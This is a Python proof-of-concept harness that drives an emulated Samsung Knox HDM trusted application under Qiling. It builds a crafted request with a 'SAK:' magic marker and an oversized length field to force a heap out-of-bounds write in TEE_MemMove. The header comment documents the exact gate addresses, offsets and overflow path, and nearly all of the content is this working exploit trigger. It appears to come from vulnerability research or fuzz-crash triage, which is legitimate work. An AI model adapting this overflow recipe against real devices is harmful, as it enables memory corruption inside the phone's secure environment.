# Deterministic PoC harness for S18 — ta_hdm (Knox HDM, UUID ...54412d48444d)
# "SAK:" unclamped heap-overflow, sink @0xc27c.
#
# Drives TA_InvokeCommandEntryPoint with the EXACT crafted request S18 describes:
#   - param_types = 0x67  (2x MEMREF_INPUT)              [gate @0x16d64 cmp w2,#0x67]
#   - cmd id      = 15    (GET_REVOKE_LIST -> 0xe680 -> sub_C18C @0xc18c)
#   - param[0]    = 0x3300-byte MEMREF                   [size gate @0x17044 ==0x3300]
#       offset 0x0000 : word-0 = 0x00000000  (!= 0xF0000000, so the large-buffer
#                       path @0x16f40 is taken; identity model returns LOGIN_PUBLIC=0)
#       offset 0x2218 : "SAK:"                            [gate func_157b0 selects unclamped path]
#       offset 0x3218 : u32 = 0x2000  -> copy len = 0x2000-4 = 0x1ffc  (> 0x1000)
#       offset 0x221c : marker bytes (so OOB content is attacker-identifiable)
#   - param[1]    = 0x3300-byte MEMREF (content irrelevant) [size gate @0x17060 ==0x3300]
#
# Entry-point copies param[0][0:0x32c4] verbatim into REQ@0x255c4 (TEE_MemMove
# @0x170a4), so REQ[0x2218]/REQ[0x3218]/REQ[0x221c] == the attacker bytes above.
# The worker then does TEE_MemMove(dst=TEE_Malloc(0x1000), src=REQ+0x221c,
# len=REQ[0x3218]-4=0x1ffc) at 0xc27c. The emulator's TEE_Malloc installs an
# asan redzone immediately past the 0x1000-byte user chunk; TEE_MemMove's
# is_access_valid(dst, 0x1ffc, write) sees [dst, dst+0x1ffc) cross that redzone
# -> "out-of-bound write" + CRASH_PC. That is a REAL TA-heap OOB write.
#
# The harness is DETERMINISTIC: it ignores the fuzzer input bytes and always
# builds the same request, so a single replay (any seed) triggers the crash.
from .params import *
from qiling import Qiling
import struct

REQ_SIZE = 0x3300          # the exact granted memref size both inputs require
SAK_OFF  = 0x2218          # magic offset
LEN_OFF  = 0x3218          # attacker length offset (read as u32 at 0xc268)
SRC_OFF  = 0x221c          # copy source offset
OVF_LEN  = 0x2000          # length field value -> memmove len = 0x2000-4 = 0x1ffc
CMD      = 15              # GET_REVOKE_LIST


def _build_request():
    buf = bytearray(REQ_SIZE)
    # word-0 must NOT be 0xF0000000 (take the 13056-byte path). 0 works.
    struct.pack_into('<I', buf, 0x0000, 0x00000000)
    # "SAK:" magic -> selects the unclamped fast-path in func_157b0.
    buf[SAK_OFF:SAK_OFF + 4] = b"SAK:"
    # attacker copy length: 0x2000 -> TEE_MemMove len = 0x1ffc, overflows 0x1000.
    struct.pack_into('<I', buf, LEN_OFF, OVF_LEN)
    # recognisable marker payload at the source so the OOB bytes are identifiable
    marker = b"S18_SAK_OVERFLOW_" * 64           # 1088 bytes, repeats clearly
    n = min(len(marker), REQ_SIZE - SRC_OFF)
    buf[SRC_OFF:SRC_OFF + n] = marker[:n]
    return bytes(buf)


def place_input_callback(ql: Qiling, input: bytes, _: int):
    req = _build_request()
    command_params = [
        MemRefParam(req, REQ_SIZE),               # param[0] MEMREF_INPUT (0x3300)
        MemRefParam(bytes(REQ_SIZE), REQ_SIZE),   # param[1] MEMREF_INPUT (0x3300)
        NoneParam(),
        NoneParam(),
    ]
    ptypes = 0x67
    setup_params_fuzz(ql, CMD, ptypes, command_params)
    return True
